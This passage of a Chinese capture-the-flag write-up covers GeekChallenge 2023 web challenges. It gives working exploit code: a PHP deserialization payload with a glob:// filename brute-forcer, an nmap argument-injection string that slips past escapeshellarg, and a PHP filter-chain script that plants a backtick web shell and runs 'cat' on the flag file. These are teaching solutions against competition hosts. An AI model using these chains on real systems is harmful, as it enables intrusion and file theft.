<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">$<span class="hljs-function"><span class="hljs-title">this</span>-&gt;</span>R<span class="hljs-function"><span class="hljs-title">uby</span>-&gt;</span>func(); <br></code></pre></td></tr></table></figure>

<p>php这边简单，看代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hoshino</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Ruby</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Idol</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$Akane</span>=<span class="hljs-string">&#x27;glob:///var/www/html/The*.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$q</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;Akane=<span class="hljs-variable">$q</span>;<br>    &#125;<br>    <br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hoshino</span>();<br><span class="hljs-variable">$a</span>-&gt;Ruby= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Idol</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;Hoshino\&quot;:1&quot;</span>,<span class="hljs-string">&quot;Hoshino\&quot;:2&quot;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure>

<p>这里让Akane的值为$argv[1]的值，可以通过外部终端传入，配合python脚本使用，</p>
<p>python脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&#x27;https://j8mh5c6z3h7vvi33edzdfdmqa.node.game.sycsec.com/?tuizi=&#x27;</span><br><br><br>filename = <span class="hljs-string">&#x27;glob:///var/www/html/The&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>dic = string.ascii_letters+string.digits+<span class="hljs-string">&#x27;_-+.&#x27;</span><br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>        file=filename+flag+i+<span class="hljs-string">&#x27;*.php&#x27;</span><br>        <span class="hljs-built_in">print</span>(file)<br>        read = os.popen(<span class="hljs-string">&#x27;php /home/yinyun/Documents/php文件/test.php &#x27;</span>+file).read()<br>        res = requests.get(url=url+read)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Kurokawa Akane&#x27;</span> <span class="hljs-keyword">in</span> res.text:<br>            flag+=i<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>

<p>爆出名字为：TheS4crEtF1AgFi1EByo2takuXX.php</p>
<p>SYC{qabhfOQdYBX0MYrA8q}</p>
<h2 id="scan-tool"><a href="#scan-tool" class="headerlink" title="scan_tool"></a>scan_tool</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/110893526">https://blog.csdn.net/weixin_44037296/article/details/110893526</a></p>
<p><strong>考点</strong>：<code>nmap -oG 写入文件</code>、<code>-iL读取扫描文件</code>、<code>escapeshellarg</code>绕过</p>
<p>PHP中的<code>escapeshellarg()</code>函数会剔除不可见字符,这个特性可以用来绕过对<code>-iL</code>、<code>-oN</code>等参数的过滤。</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">ip</span>=<span class="hljs-string">&#x27; -i%faL /flag -o%faN 1.txt &#x27;</span><br></code></pre></td></tr></table></figure>

<p>然后看1.txt即可拿到flag</p>
<p>SYC{jvphuvHv43WbXRMoan}</p>
<h2 id="ezrfi"><a href="#ezrfi" class="headerlink" title="ezrfi"></a>ezrfi</h2><p>hint为：</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">w<span class="hljs-number">5</span>YubyBvd<span class="hljs-number">08</span>gMHcwI<span class="hljs-name">G92</span>MCDDl<span class="hljs-symbol">ndvIE8</span>ubyAwLjAgMC<span class="hljs-number">5</span>vIMOWdjAgMHbDliBPdjAgT<span class="hljs-number">3</span>fDliBvLk<span class="hljs-number">8</span>gw<span class="hljs-number">5</span>Z<span class="hljs-number">2</span>TyAwXzAgMF<span class="hljs-number">9</span>PI<span class="hljs-name">G8</span>uTyAwdjAgw<span class="hljs-number">5</span>ZfbyBPd<span class="hljs-number">28</span>gw<span class="hljs-number">5</span>Z<span class="hljs-number">2</span>TyDDli<span class="hljs-number">5</span>PIMOWXzAgTy<span class="hljs-number">5</span>PIMOWXzAgMHbDliAwLjAgw<span class="hljs-number">5</span>Z<span class="hljs-number">2</span>w<span class="hljs-number">5</span>Ygw<span class="hljs-number">5</span>Z<span class="hljs-number">3</span>MCBPdsOWIMOWdjAgT<span class="hljs-number">1</span>/DliDDl<span class="hljs-symbol">nZPIMOWLk8</span>gw<span class="hljs-number">5</span>Z<span class="hljs-number">3</span>MCBvd<span class="hljs-number">8</span>OWIMOWL<span class="hljs-name">m8</span>gTy<span class="hljs-number">5</span>vIMOWXzAgMHbDliDDl<span class="hljs-symbol">ndvIE93</span>w<span class="hljs-number">5</span>YgTy<span class="hljs-number">5</span>vIE<span class="hljs-number">93</span>TyBvX<span class="hljs-number">28</span>gw<span class="hljs-number">5</span>YuTyBvL<span class="hljs-name">m8</span>gb<span class="hljs-number">3</span>dPIMOWXzAgb<span class="hljs-number">3</span>dPIMOWXzAgMHZvI<span class="hljs-name">G8</span>uTyBPd<span class="hljs-number">8</span>OWIE<span class="hljs-number">92</span>byAwLsOWIMOWdjAgTy<span class="hljs-number">7</span>DliAwLjAgMHfDliBvLsOWI<span class="hljs-name">G93</span>byBvdzAgMHZvIMOWL<span class="hljs-name">m8</span>gb<span class="hljs-number">3</span>dPI<span class="hljs-name">G9</span>fMCDDli<span class="hljs-number">5</span>PI<span class="hljs-name">G9</span>fbyBPd<span class="hljs-number">8</span>OWIE<span class="hljs-number">8</span>ubyBvdzAgw<span class="hljs-number">5</span>ZfbyBvd<span class="hljs-number">28</span>gw<span class="hljs-number">5</span>YuMCDDl<span class="hljs-symbol">nZPIG9</span>fTyBPLsOWIE<span class="hljs-number">92</span>MCBPdzAgby<span class="hljs-number">7</span>DliAwdjAgT<span class="hljs-number">3</span>YwIE<span class="hljs-number">9</span>fTyBvLk<span class="hljs-number">8</span><span class="hljs-keyword">gT</span><span class="hljs-number">3</span>bDliDDl<span class="hljs-symbol">nYwIMOWXzAgw5</span>Z<span class="hljs-number">3</span>byBvd<span class="hljs-number">08</span><span class="hljs-keyword">gT</span><span class="hljs-number">19</span>vIE<span class="hljs-number">93</span>w<span class="hljs-number">5</span>Ygby<span class="hljs-number">5</span>PIMOWdk<span class="hljs-number">8</span>gby<span class="hljs-number">4</span>wIDBfMCDDll<span class="hljs-number">9</span>vI<span class="hljs-name">G93</span>TyBPXzAgMC<span class="hljs-number">7</span>DliDDli<span class="hljs-number">5</span>vIE<span class="hljs-number">8</span>uTyBPdzAgT<span class="hljs-number">19</span>vIMOWdjAgb<span class="hljs-number">3</span>cwIMOWdjAgT<span class="hljs-number">18</span>wIMOWd<span class="hljs-name">m8</span>gw<span class="hljs-number">5</span>Z<span class="hljs-number">2</span>w<span class="hljs-number">5</span>Ygw<span class="hljs-number">5</span>ZfbyAwX<span class="hljs-number">8</span>OWIMOWd<span class="hljs-name">m8</span>gw<span class="hljs-number">5</span>Z<span class="hljs-number">2</span>w<span class="hljs-number">5</span>YgMHcwIE<span class="hljs-number">92</span>w<span class="hljs-number">5</span>Ygw<span class="hljs-number">5</span>YubyDDli<span class="hljs-number">4</span>wIMOWL<span class="hljs-name">m8</span>gb<span class="hljs-number">3</span>ZvIMOWLjAgw<span class="hljs-number">5</span>YuMCAwd<span class="hljs-number">28</span>gb<span class="hljs-number">3</span>dPI<span class="hljs-name">G8</span>uTyAwd<span class="hljs-number">8</span>OWIDB<span class="hljs-number">2</span>MCBvd<span class="hljs-number">8</span>OWIMOWdzAgw<span class="hljs-number">5</span>YubyAwdzAgT<span class="hljs-number">1</span>/DliBvX<span class="hljs-number">08</span>gw<span class="hljs-number">5</span>Z<span class="hljs-number">2</span>byAg<br></code></pre></td></tr></table></figure>

<p>base64解码：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Ö<span class="hljs-selector-class">.o</span> owO <span class="hljs-number">0</span>w0 ov0 Öwo O<span class="hljs-selector-class">.o</span> <span class="hljs-number">0.0</span> <span class="hljs-number">0</span><span class="hljs-selector-class">.o</span> Öv0 <span class="hljs-number">0</span>vÖ Ov0 OwÖ o<span class="hljs-selector-class">.O</span> ÖvO <span class="hljs-number">0</span>_0 <span class="hljs-number">0</span>_O o<span class="hljs-selector-class">.O</span> <span class="hljs-number">0</span>v0 Ö_o Owo ÖvO Ö<span class="hljs-selector-class">.O</span> Ö_0 O<span class="hljs-selector-class">.O</span> Ö_0 <span class="hljs-number">0</span>vÖ <span class="hljs-number">0.0</span> ÖvÖ Öw0 OvÖ Öv0 O_Ö ÖvO Ö<span class="hljs-selector-class">.O</span> Öw0 owÖ Ö<span class="hljs-selector-class">.o</span> O<span class="hljs-selector-class">.o</span> Ö_0 <span class="hljs-number">0</span>vÖ Öwo OwÖ O<span class="hljs-selector-class">.o</span> OwO o_o Ö<span class="hljs-selector-class">.O</span> o<span class="hljs-selector-class">.o</span> owO Ö_0 owO Ö_0 <span class="hljs-number">0</span>vo o<span class="hljs-selector-class">.O</span> OwÖ Ovo <span class="hljs-number">0</span>.Ö Öv0 O.Ö <span class="hljs-number">0.0</span> <span class="hljs-number">0</span>wÖ o.Ö owo ow0 <span class="hljs-number">0</span>vo Ö<span class="hljs-selector-class">.o</span> owO o_0 Ö<span class="hljs-selector-class">.O</span> o_o OwÖ O<span class="hljs-selector-class">.o</span> ow0 Ö_o owo Ö.<span class="hljs-number">0</span> ÖvO o_O O.Ö Ov0 Ow0 o.Ö <span class="hljs-number">0</span>v0 Ov0 O_O o<span class="hljs-selector-class">.O</span> OvÖ Öv0 Ö_0 Öwo owO O_o OwÖ o<span class="hljs-selector-class">.O</span> ÖvO o.<span class="hljs-number">0</span> <span class="hljs-number">0</span>_0 Ö_o owO O_0 <span class="hljs-number">0</span>.Ö Ö<span class="hljs-selector-class">.o</span> O<span class="hljs-selector-class">.O</span> Ow0 O_o Öv0 ow0 Öv0 O_0 Övo ÖvÖ Ö_o <span class="hljs-number">0</span>_Ö Övo ÖvÖ <span class="hljs-number">0</span>w0 OvÖ Ö<span class="hljs-selector-class">.o</span> Ö.<span class="hljs-number">0</span> Ö<span class="hljs-selector-class">.o</span> ovo Ö.<span class="hljs-number">0</span> Ö.<span class="hljs-number">0</span> <span class="hljs-number">0</span>wo owO o<span class="hljs-selector-class">.O</span> <span class="hljs-number">0</span>wÖ <span class="hljs-number">0</span>v0 owÖ Öw0 Ö<span class="hljs-selector-class">.o</span> <span class="hljs-number">0</span>w0 O_Ö o_O Övo  <br></code></pre></td></tr></table></figure>

<p>尊嘟假嘟解密：</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Shy<span class="hljs-number">0</span>JhFpsi+<span class="hljs-symbol">njV0</span>IfFfzS<span class="hljs-number">44</span>KIcwPF<span class="hljs-name">g312</span>q<span class="hljs-meta">o6</span>gfdk<span class="hljs-number">0</span>+DzcoMdSg<span class="hljs-attr">Vs15</span>cERxpq<span class="hljs-symbol">nPJh4</span>Y<span class="hljs-number">3</span>b<span class="hljs-number">3</span>i/mcbkPlHGTIA<span class="hljs-number">6</span>/A<span class="hljs-number">8</span>CQU<span class="hljs-number">8</span>UX<span class="hljs-number">6</span>j<span class="hljs-number">9</span>w<span class="hljs-number">5</span>HKy<br></code></pre></td></tr></table></figure>

<p>rc4解密：密钥靠猜：Syclover</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">文件包含逻辑是<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;.py&quot;</span>),你能找到flag文件位置吗<span class="hljs-string">??</span><br></code></pre></td></tr></table></figure>

<p>后缀给死了，我们可以利用<code>php filter chain</code>突破后缀”限制”。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;https://o8psad59go93x7xvicykjqu7c.node.game.sycsec.com/index.php&quot;</span><br><span class="hljs-comment">#可以读取到的文件</span><br>file_to_use = <span class="hljs-string">&quot;/var/hint&quot;</span><br><span class="hljs-comment">#要执行的命令</span><br>command = <span class="hljs-string">&quot;cat /ffffffllllag&quot;</span><br><br><span class="hljs-comment">#两个分号避开了最终 base64 编码中的斜杠</span><br><span class="hljs-comment">#&lt;?=`$_GET[0]`;;?&gt;</span><br>base64_payload = <span class="hljs-string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span><br><br>conversions = &#123;<br>    <span class="hljs-string">&#x27;R&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;B&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;C&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,<br>    <span class="hljs-string">&#x27;8&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;9&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;f&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;s&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,<br>    <span class="hljs-string">&#x27;z&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,<br>    <span class="hljs-string">&#x27;U&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,<br>    <span class="hljs-string">&#x27;P&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;V&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,<br>    <span class="hljs-string">&#x27;0&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;Y&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;W&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;D&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;7&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;4&#x27;</span>: <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span><br>&#125;<br><br><br><span class="hljs-comment"># generate some garbage base64</span><br>filters = <span class="hljs-string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span><br>filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br><span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br>filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> base64_payload[::-<span class="hljs-number">1</span>]:<br>        filters += conversions[c] + <span class="hljs-string">&quot;|&quot;</span><br>        <span class="hljs-comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span><br>        filters += <span class="hljs-string">&quot;convert.base64-decode|&quot;</span><br>        filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br>        <span class="hljs-comment"># get rid of equal signs</span><br>        filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br>filters += <span class="hljs-string">&quot;convert.base64-decode&quot;</span><br><br>final_payload = <span class="hljs-string">f&quot;php://filter/<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;file_to_use&#125;</span>&quot;</span><br><br>r = requests.get(url, params=&#123;<br>    <span class="hljs-string">&quot;0&quot;</span>: command,<br>    <span class="hljs-string">&quot;action&quot;</span>: <span class="hljs-string">&quot;xxx&quot;</span>,<br>    <span class="hljs-string">&quot;file&quot;</span>: final_payload<br>&#125;)<br><br><span class="hljs-built_in">print</span>(r.text)<br><br></code></pre></td></tr></table></figure>

<p>SYC{The PhpFFffilter 0n File-include vulnerabilities is s0 Amazing!!#@##&#125;</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/WPs/" class="category-chain-item">WPs</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/WPs/" class="print-no-link">#WPs</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>GeekChallenge 2023 WEB赛题目WP</div>
      <div>http://example.com/2023/11/28/GeekChallenge 2023 WEB赛题WP/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Infernity</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年11月28日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/01/31/Hgame%202024%20week%201/" title="Hgame 2024 week 1">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Hgame 2024 week 1</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    

  

</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>





  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
